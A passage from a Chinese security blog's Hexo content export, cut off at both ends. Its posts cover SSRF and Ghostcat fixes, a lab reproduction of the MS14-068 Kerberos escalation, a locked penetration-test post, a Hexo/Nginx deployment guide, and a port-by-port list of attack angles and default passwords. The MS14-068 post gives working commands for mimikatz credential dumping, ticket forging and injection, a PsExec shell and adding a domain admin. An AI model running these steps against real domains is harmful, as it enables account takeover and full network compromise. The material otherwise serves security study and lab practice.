中的相关关键词，比如：&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC 等。</li></ul></li></ul><h2 id="SSRF服务器请求伪造">SSRF服务器请求伪造</h2><ol><li>禁用不需要的协议，只允许 HTTP 和 HTTPS 请求，可以防止类似于 file://, gopher://, ftp:// 等引起的问题。</li><li>白名单的方式限制访问的目标地址，禁止对内网发起请求。</li><li>过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>验证请求的文件格式,禁止跟随 301、302 跳转。</li><li>限制请求的端口为 http 常用的端口，比如 80、443、8080、8000 等。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ol><ul><li><p>解析目标URL</p></li><li><ul><li>获取scheme、host（推荐使用系统内置函数完成,避免自己使用正则提取）。</li></ul></li><li><p>校验scheme</p></li><li><ul><li>检查 scheme 是否为合法 (如非特殊需求请只允许 http 和 https)。</li></ul></li><li><p>获取解析IP</p></li><li><ul><li>解析 host 获取 dns 解析后的 IP 地址。</li></ul></li><li><p>检测IP是否合法</p></li><li><ul><li>检查解析后的 IP 地址是否为外网地址或者合法 IP。</li></ul></li></ul><h2 id="Ghostcat-CVE-2020-1938-漏洞">Ghostcat(CVE-2020-1938)漏洞</h2><p>针对 CVE-2020-1938 漏洞，Apache Tomcat 官方已放出相应的修复新版本，建议及时安装官方新版本。</p><p>注：本文内容来自网络</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> 修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现MS14-068</title>
      <link href="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/"/>
      <url>/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/</url>
      
        <content type="html"><![CDATA[<h1>MS14-068</h1><p><strong>漏洞概述</strong></p><blockquote><p>该漏洞允许黑客提升任意普通用户权限成为域管理员（Domain Admin）身份。也就是说，你在一台普通域用户的机器上利用这个漏洞，那么这个域用户就变成域管理员权限，然后该域用户就可以控制整个域的所有机器了。只要服务器未打ms14-068补丁（KB3011780），在server 2000以上的域控服务器中，都可进行利用。</p></blockquote><p><strong>影响版本</strong>：全部版本Windows服务器</p><p><strong>环境</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">域：winyhl.local<br>域控：win server 2008 192.168.254.140<br>域内主机：win7 192.168.254.143<br></code></pre></td></tr></table></figure><p><strong>利用条件</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1、获取域普通用户的账号密码<br>2、获取域普通用户的sid<br>3、服务器未打KB3011780补丁<br>4、域控服务器的IP<br></code></pre></td></tr></table></figure><p><strong>漏洞利用思路</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1、首先利用ms14-068提权工具生成伪造的kerberos协议认证证书（黄金票据）<br>2、利用mimikatz.exe将证书写入，从而提升为域管理员 <br>3、测试是否能访问域控C盘目录，能访问则说明提升为域管理员<br>4、利用PsExec.exe获取域控shell，添加用户并将其加入域管理员组<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net config workstation,可知域名和其他信息<br>nltest /dsgetdc:域名,可知 DC 主机名<br>whoami /all 查看用户sid<br></code></pre></td></tr></table></figure><h5 id="查看当前用户是否为域用户">查看当前用户是否为域用户</h5><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">net user wintext /domain<br></code></pre></td></tr></table></figure><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115112639735.png" alt></p><h5 id="查看域控是否打ms14-068漏洞补丁">查看域控是否打ms14-068漏洞补丁</h5><p>使用systeminfo命令查看所打补丁，发现没有KB3011780，可以利用</p><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115112732419.png" alt></p><h5 id="获取域控信息">获取域控信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net group “domain controllers” /domain<br></code></pre></td></tr></table></figure><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115112816109.png" alt></p><p>得到了域名server-2008以及域控的主机名<br>Ping一下该域控的主机名，以找到域控ip地址<br>注意：ping的时候去掉主机名后面的 $ 符号</p><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115112910510.png" alt></p><p>ip 192.168.254.140</p><h5 id="通过dir访问域控的共享文件夹，显示拒绝访问">通过dir访问域控的共享文件夹，显示拒绝访问</h5><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115112950315.png" alt></p><h5 id="获取当前域机器的域用户名、密码、用户sid等信息">获取当前域机器的域用户名、密码、用户sid等信息</h5><h6 id="获取用户sid（当前用户是域用户）">获取用户sid（当前用户是域用户）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">whoami /user<br></code></pre></td></tr></table></figure><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113019147.png" alt></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">获取域内所有用户的 SID：<br>wmic useraccount get name,sid<br></code></pre></td></tr></table></figure><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113039155.png" alt></p><h6 id="不是域用户">不是域用户</h6><p>用mimikatz 抓取本地的域用户密码</p><p>管理员权限运行</p><p>输入privilege::debug 权限提升，在输入log 会在当前文件夹下生成后面命令执行的结果方便我们查找数据，最后输入sekurlsa::logonPasswords 抓取密码</p><p>会在当前目录生成mimikatz 日志文件</p><p>成功获取到明文密码，也获取了域用户sid 和域控主机名</p><h5 id="删除系统原有票据">删除系统原有票据</h5><p>klist查看当前缓存的票据<br>为了防止影响我们的操作,删除已有的票据 klist purge</p><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113119435.png" alt></p><h5 id="生成票据">生成票据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码<br>ms14-068.py -u 域成员@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码<br></code></pre></td></tr></table></figure><h6 id="会在当前目录生成一个ccache文件">会在当前目录生成一个ccache文件</h6><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113212762.png" alt></p><h6 id="再使用mimikatz将票据（TGT）注入到当前内存中，来伪造kerberos协议认证证书。">再使用mimikatz将票据（TGT）注入到当前内存中，来伪造kerberos协议认证证书。</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">kerberos::purge         //清空当前所有凭证<br>kerberos::list          //查看当前凭证<br>kerberos::ptc TGT_tidetest@tide.org.ccache   //将票据注入到内存中<br></code></pre></td></tr></table></figure><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113247748.png" alt></p><h5 id="成功访问（管理员权限）">成功访问（管理员权限）</h5><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113327691.png" alt></p><h6 id="可以看到票据里只有我的当前用户">可以看到票据里只有我的当前用户</h6><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113402924.png" alt></p><h5 id="用PsExec-exe工具反弹cmd，获取一个交互式shell">用PsExec.exe工具反弹cmd，获取一个交互式shell</h5><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113547322.png" alt></p><h6 id="看到域控的ip">看到域控的ip</h6><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115113855974.png" alt></p><h6 id="添加域管理员">添加域管理员</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net user linlin 123.com /add /domain<br>net group “Domain admins” linlin /add /domain<br></code></pre></td></tr></table></figure><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115114228426.png" alt></p><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221115115339415.png" alt></p><p>清除则不能访问</p><h2 id="Metasploit-中进行测试（扩展后面没搞了）"><strong>Metasploit 中进行测试（扩展后面没搞了）</strong></h2><p>在 MSF 中，也有一个针对 MS14-068 漏洞利用的模块：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum<br></code></pre></td></tr></table></figure><p>它只需要输入域名、被提权用户的密码、被提权用户、被提权用户的SID，域控制器的IP：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">域成员：<br>域名：<br>域成员的 sid：<br>域控制器地址：<br>域成员的密码：<br>set domain <br>set password <br>set user <br>set user_sid <br>set rhosts <br>run<br></code></pre></td></tr></table></figure><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221114105443550.png" alt></p><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221114105343421.png" alt></p><p>生成</p><p>/root/.msf4/loot/20221114105328_default_192.168.254.133_windows.kerberos_896806.bin</p><p>在 mimikatz 中输入命令，导出 kirbi 格式的文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">kerberos::clist &quot;20221114105328_default_192.168.254.133_windows.kerberos_896806.bin&quot; /export<br></code></pre></td></tr></table></figure><p><img src="/2023/01/30/%E5%A4%8D%E7%8E%B0MS14-068/image-20221114111610761.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>境外渗透_01</title>
      <link href="/2023/01/03/10%E6%9C%88%E5%A2%83%E5%A4%96%E6%B8%97%E9%80%8F/"/>
      <url>/2023/01/03/10%E6%9C%88%E5%A2%83%E5%A4%96%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="607c791e6f954ec607f2052a1abac48e3fdd22cb8adc7c7153e32c99e32682de"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo部署服务器</title>
      <link href="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1>部署环境</h1><ul><li><p>本地环境</p><ul><li>Windows10(64bit)</li><li>环境：<code>git</code>，<code>Node.js</code>，<code>hexo</code>…</li><li>生成本地静态网站</li></ul></li><li><p>服务器环境</p><ul><li>腾讯云主机(CentOS 7.5 64bit)</li><li>环境：<code>git</code>，<code>Nginx</code>，<code>创建 git 用户</code></li><li>使用 git 自动化部署发布</li></ul><h1>服务器配置</h1><p>连接服务器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh -v root@ip<br></code></pre></td></tr></table></figure><h2 id="1-安装-Git-源码包安装">1. 安装 Git (源码包安装)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">因为 yum 源仓库的 Git 版本更新不及时，所以采用源码包进行安装。<br></code></pre></td></tr></table></figure></li></ul><h3 id="1-1-安装依赖包">1.1 安装依赖包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel<br>yum install  gcc perl-ExtUtils-MakeMaker<br></code></pre></td></tr></table></figure><p>通过命令 <code>git --version</code> 可以看到，Git 当前的版本号为 <code>1.8.3.1</code>，太过于陈旧，所以需要先把它移除了。</p><h3 id="1-2-卸载旧版本的-Git">1.2 卸载旧版本的 Git</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">yum remove git<br></code></pre></td></tr></table></figure><h3 id="1-3-下载并解压">1.3 下载并解压</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cd /usr/local/src   // 选择文件保存位置<br>wget https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.39.0.tar.gz   // 下载链接<br>tar -zxvf git-2.39.0.tar.gz   // 解压<br></code></pre></td></tr></table></figure><p>注：</p><p>当我们使用 <a href="https://so.csdn.net/so/search?q=wget&amp;spm=1001.2101.3001.7020">wget</a>命令下载不安全的https 域名下的内容时会提示如下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cannot verify pkg.jenkins.io&#x27;s certificate, issued by ‘/C=US/O=Let&#x27;s Encrypt/CN=R3’<br>Issued certificate has expired. To connect to pkg.jenkins.io insecurely, use `--no-check-certificate&#x27;.<br></code></pre></td></tr></table></figure><p>修复：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sudo yum install -y ca-certificates<br></code></pre></td></tr></table></figure><p>版本以及之后版本可<a href="https://mirrors.edge.kernel.org/pub/software/scm/git">到此</a>进行查看。解压后，会在当前目录下自动生成一个名为 <code>git-2.39.0</code> 的文件夹，里面就是解压出来的文件。可通过命令 <code>ls</code> 进行查看。</p><h3 id="1-4-编译安装">1.4 编译安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cd git-2.39.0   // 进入文件夹<br>make prefix=/usr/local/git all  // 编译源码<br>make prefix=/usr/local/git install  // 安装至 /usr/local/git 路径<br></code></pre></td></tr></table></figure><p>打开环境变量配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">vim /etc/profile<br></code></pre></td></tr></table></figure><p>在文件底部添加以下配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PATH=$PATH:/usr/local/git/bin   // git 的目录<br>export PATH<br></code></pre></td></tr></table></figure><p>刷新环境变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">source /etc/profile<br></code></pre></td></tr></table></figure><p>最后再使用 <code>git --version</code> 查看版本号，已经为 <code>2.39.0</code></p><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png" alt></p><h2 id="2-git-新用户及配置">2. git 新用户及配置</h2><h3 id="2-1-创建-git-用户">2.1 创建 git 用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">adduser y.lin<br>passwd git<br>chmod 740 /etc/sudoers<br>vim /etc/sudoers<br></code></pre></td></tr></table></figure><p>在英文输入法下，按Esc然后按shift和冒号，输入<code>set nu</code>就可以显示行号</p><p>找到以下内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">## Allow root to run any commands anywhere<br>root    ALL=(ALL)       ALL<br></code></pre></td></tr></table></figure><p>在它下面添加一行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">y.lin ALL=(ALL) ALL<br></code></pre></td></tr></table></figure><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20230103112106973.png" alt></p><p>保存并退出，将权限修改回来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">chmod 400 /etc/sudoers<br></code></pre></td></tr></table></figure><h3 id="2-2-密钥配置">2.2 密钥配置</h3><p>本地中，使用 <code>Git Bash/powershell</code> 创建密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 本地 windows <br>ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20230103112427086.png" alt></p><p>切换至 <code>y.lin</code> 用户，创建 <code>.ssh</code> 文件夹以及 <code>authorized_keys</code> 文件并将本地的 <code>id_rsa.pub</code> 文件内容粘贴到里面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">su y.lin<br>mkdir ~/.ssh<br>vim ~/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p>修改权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cd ~<br>chmod 600 .ssh/authorzied_keys<br>chmod 700 .ssh<br></code></pre></td></tr></table></figure><h3 id="2-3-测试">2.3 测试</h3><p>在本地 Windows 上，使用 <code>Git Bash</code> 测试是否能连接上服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh -v y.lin@ip<br></code></pre></td></tr></table></figure><p>其中 SERVER 为服务器 ip 地址。若出现以下错误提示，检查本地密钥位置是否存在 <code>known_hosts</code> 文件，将其删除重新测试。测试结果为，不需要密码直接进入</p><h3 id="2-4-创建网站目录">2.4 创建网站目录</h3><p>创建一个目录用于作为网站的根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">su root<br>mkdir /home/hexo    # 此目录为网站的根目录<br></code></pre></td></tr></table></figure><p>赋予权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">chown y.lin:y.lin -R /home/hexo<br></code></pre></td></tr></table></figure><h2 id="3-安装配置-Nginx">3. 安装配置 Nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">注意需要 root 权限<br>yum install -y nginx    // 安装<br>systemctl start nginx.service     // 启动服务<br></code></pre></td></tr></table></figure><p>使用 yum 安装的 nginx 在新版的 CentOS 中，需要使用 <code>systemctl</code>，而不是直接使用 <code>service start nginx</code><br>此时通过服务器的公网 IP 地址访问，可以看到 nginx 的欢迎页面，表示安装成功，如下图</p><h3 id="3-2-配置-Nginx">3.2 配置 Nginx</h3><p>使用 <code>nginx -t</code> 命令查看位置，一般为 <code>/etc/nginx/nginx.conf</code>。<br>使用 <code>vim /etc/nginx/nginx.conf</code> 命令进行编辑，修改配置文件如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">server &#123;<br>    listen       80 default_server;<br>    listen       [::]:80 default_server;<br>    server_name  yelin.fun;    # 修改为自己的域名<br>    root         /home/hexo;    # 修改为网站的根目录<br><br>    # Load configuration files for the default server block.<br>    include /etc/nginx/default.d/*.conf;<br><br>    location / &#123;<br>    &#125;<br><br>    error_page 404 /404.html;<br>        location = /40x.html &#123;<br>    &#125;<br><br>    error_page 500 502 503 504 /50x.html;<br>        location = /50x.html &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20230103123010379.png" alt></p><p><code>root</code> 处的网站目录，需要自己创建，也就是部署上传的位置</p><p>注意使用 <code>nginx -t</code> 命令检查配置文件的语法是否出错。然后使用 <code>systemctl restart nginx.service</code> 命令重启服务即可</p><h2 id="4-自动化部署">4. 自动化部署</h2><h3 id="4-1-建立-git-裸库">4.1 建立 git 裸库</h3><p>创建一个裸仓库，裸仓库就是只保存 <code>git</code> 信息的 <code>Repository</code>, 首先切换到 <code>git</code> 用户确保 git 用户拥有仓库所有权，一定要加 <code>--bare</code>，这样才是一个裸库.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">su root<br>cd /home/git   # 在 git 用户目录下创建<br>git init --bare blog.git<br></code></pre></td></tr></table></figure><p>这时，<code>git</code> 用户的 <code>~</code> 目录下就存在一个 <code>blog.git</code> 文件夹，可使用 <code>ls</code> 命令查看。再修改 <code>blog.git</code> 的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">chown git:git -R blog.git<br></code></pre></td></tr></table></figure><h3 id="4-2-使用-git-hooks-同步网站根目录">4.2 使用 git-hooks 同步网站根目录</h3><p>在这使用的是 <code>post-receive</code> 这个钩子，当 <code>git</code> 有收发的时候就会调用这个钩子。 在 <code>blog.git</code> 裸库的 hooks 文件夹中，新建 <code>post-receive</code> 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">vim blog.git/hooks/post-receive<br></code></pre></td></tr></table></figure><p>填入以下内容，其中 <code>/home/hexo</code> 为网站目录，根据自己的填入,保存退出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#!/bin/sh<br>git --work-tree=/home/hexo --git-dir=/home/git/blog.git checkout -f<br></code></pre></td></tr></table></figure><h1>本地配置</h1><p>在本地中，和部署到 <code>pages</code> 服务一样，需要先 <code>hexo g</code> 命令生成静态文件，通过 <code>hexo s</code> 命令能够正常进行本地访问，并且确保已经安装了 <code>hexo-deployer-git</code></p><h2 id="配置-config-yml">配置 <code>_config.yml</code></h2><p><a href="https://so.csdn.net/so/search?q=hexo&amp;spm=1001.2101.3001.7020">hexo</a> 根目录下的 <code>_config.yml</code> 文件，找到 <code>deploy</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deploy:<br>    type: git<br>    repo: git@SERVER:/home/git/blog.git     # 用户名@服务器Ip:git仓库位置<br>    branch: master      # 分支<br></code></pre></td></tr></table></figure><p>之后按照正常的流程进行部署即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo clean<br>hexo g<br>hexo d<br></code></pre></td></tr></table></figure><h1>Nginx 服务器 SSL 证书安装部署</h1><p>在SSL证书管理下载nginx证书</p><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20230816150802824-1692169693027-1.png" alt="image-20230816150802824"></p><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20230816151014860.png" alt="image-20230816151014860"></p><p>将文件上传服务器的 <code> /etc/nginx/conf</code> 目录</p><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20230816151818798.png" alt="image-20230816151818798"></p><p>编辑 Nginx 根目录下的 <code>nginx.conf</code> 文件</p><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20230816152123392.png" alt="image-20230816152123392"></p><p>通过执行以下命令验证配置文件问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nginx -t<br></code></pre></td></tr></table></figure><p><img src="/2023/01/03/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20230816152538433.png" alt="image-20230816152538433"></p><p>成功</p><p>重载nginx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nginx -s reload<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 网站 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口漏洞</title>
      <link href="/2023/01/02/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/01/02/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h5 id="20">20</h5><p>FTP服务的数据传输端口</p><h5 id="21-FTP">21 FTP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">默认用户名密码 anonymous:anonymous<br><br>暴力破解密码<br><br>VSFTP某版本后门<br></code></pre></td></tr></table></figure><h5 id="22-SSH">22 SSH</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">暴力破解密码<br></code></pre></td></tr></table></figure><h5 id="23-Telent">23 Telent</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">暴力破解密码<br></code></pre></td></tr></table></figure><h5 id="25-SMTP">25 SMTP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">无认证时可伪造发件人<br></code></pre></td></tr></table></figure><h5 id="43">43</h5><p>whois服务端口</p><h5 id="53-DNS-53-UDP">53 DNS 53 UDP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">测试域传送漏洞<br>SPF / DMARC Check<br>DDos<br>DNS Query Flood<br>DNS 反弹<br></code></pre></td></tr></table></figure><h5 id="67-68">67/68</h5><p>DHCP服务端口</p><h5 id="69">69</h5><p>TFTP端口，可能存在弱口令</p><h5 id="80">80</h5><p>HTTP端口，常见web漏洞</p><h5 id="110">110</h5><p>POP3邮件服务端口，和SMTP的25端口对应</p><h5 id="135">135</h5><p>RPC服务</p><h5 id="137-139-445-SMB">137/139/445 SMB</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">为授权访问<br>弱口令<br></code></pre></td></tr></table></figure><h5 id="161-162-SNMP">161/162 SNMP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Public 弱口令<br></code></pre></td></tr></table></figure><h5 id="389-LDAP">389 LDAP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">匿名访问<br>注入<br></code></pre></td></tr></table></figure><h5 id="443">443</h5><p>HTTPS端口，心脏滴血等与SSL有关的漏洞</p><h5 id="445">445</h5><p>SMB服务端口，可能存在永恒之蓝漏洞MS17-010</p><h5 id="512-513-514">512/513/514</h5><p>Linux Rexec服务端口，可能存在爆破</p><h5 id="873-Rsync">873 Rsync</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">任意文件读写<br></code></pre></td></tr></table></figure><h5 id="1025-RPC">1025 RPC</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">NFS匿名访问<br></code></pre></td></tr></table></figure><h5 id="1080">1080</h5><p>socket端口，可能存在爆破</p><h5 id="1099">1099</h5><p>RMI，可能存在 RMI反序列化漏洞</p><h5 id="1352">1352</h5><p>Lotus domino邮件服务端口，可能存在弱口令、信息泄露</p><h5 id="1433-MSSQL">1433 MSSQL</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">弱密码<br></code></pre></td></tr></table></figure><h5 id="1434">1434</h5><p>用于向请求者返回SQL Server使用了哪个TCP/IP端口</p><h5 id="1521-Oracel">1521 Oracel</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">弱密码<br></code></pre></td></tr></table></figure><h5 id="2049-NFS">2049 NFS</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">权限设置不当<br></code></pre></td></tr></table></figure><h5 id="2181-ZooKeeper">2181 ZooKeeper</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">无身份认证<br></code></pre></td></tr></table></figure><h5 id="2375">2375</h5><p>Docker端口，可能存在 Docker未授权访问漏洞</p><h5 id="2601">2601</h5><p>Zebra ，默认密码zebr</p><h5 id="3128">3128</h5><p>squid ，匿名访问（可能内网漫游)</p><h5 id="3306-MySQL">3306 MySQL</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">弱密码<br></code></pre></td></tr></table></figure><h5 id="3389-RDP">3389 RDP</h5><p>Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">弱密码<br></code></pre></td></tr></table></figure><h5 id="3690">3690</h5><p>SVN服务，可能存在SVN泄漏，未授权访问漏洞</p><h5 id="4440">4440</h5><p>Rundeck，弱口令admin</p><h5 id="4560">4560</h5><p>log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）</p><h5 id="4750">4750</h5><p>BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)</p><h5 id="4848">4848</h5><p>GlassFish控制台端口，可能存在弱口令admin/adminadmin</p><h5 id="5000">5000</h5><p>SysBase/DB2数据库端口，可能存在爆破、注入漏洞</p><h5 id="5432-Postgres">5432 Postgres</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">弱密码<br></code></pre></td></tr></table></figure><h5 id="5632">5632</h5><p>PyAnywhere服务端口，可能存在代码执行漏洞</p><h5 id="5900-5901">5900/5901</h5><p>VNC监听端口，可能存在 VNC未授权访问漏洞</p><h5 id="5984-CouchDB">5984 CouchDB</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">未授权访问<br></code></pre></td></tr></table></figure><h5 id="6379-Redis">6379 Redis</h5><figure 